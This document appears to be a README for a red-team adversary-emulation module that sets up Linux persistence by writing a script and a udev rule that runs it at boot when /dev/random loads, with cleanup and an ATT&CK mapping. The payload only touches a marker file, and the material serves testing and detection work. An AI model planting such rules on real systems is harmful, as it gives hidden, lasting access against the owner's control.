# UDEV Persistence Technique

![Meta TTP](https://img.shields.io/badge/Meta_TTP-red)

This TTP utilizes a method of establishing persistence by creating a script that is automatically executed at boot time when the `/dev/random` device is loaded. It leverages udev rules to execute the script, making this an effective technique for maintaining access during system initialization.

## Arguments

- **target_path**: The path where the script and udev rule will be created.

  Default: /dev

## Requirements

1. Access to a Linux system with permissions to modify udev rules.
1. Ability to write files in critical system directories.

## Examples

You can run the TTP using the following command (adjust arguments as needed):

```bash
ttpforge run forgearmory//persistence/unix/udev-persistence/udev-persistence.yaml \
    --arg target_path="/your/custom/path"
```

## Steps

1. **create_persistence_script**: Creates a script in the specified path that will be executed upon system boot.

   ```bash
   #!/bin/bash
   echo "touch /root/exploited" > {{ .Args.target_path }}/udev.sh
   chmod 0600 {{ .Args.target_path }}/udev.sh
   ```

1. **add_udev_rule**: Adds a udev rule that triggers the script execution when the `/dev/random` device is loaded at boot time.

   ```bash
   echo 'ACTION=="add", ENV{MAJOR}=="1", ENV{MINOR}=="8", RUN+="/bin/sh -c '{{ .Args.target_path }}/udev.sh'"' > /etc/udev/rules.d/75-persistence.rules
   ```

## Cleanup

1. **remove_udev_rule**: Deletes the udev rule from the system.

   ```bash
   rm /etc/udev/rules.d/75-persistence.rules
   ```

## MITRE ATT&CK Mapping

- **Tactics**:
  - TA0003 Persistence
- **Techniques**:
  - T1546 Event Triggered Execution
- **Subtechniques**:
  - T1546.004 Unix Shell Configuration Modification
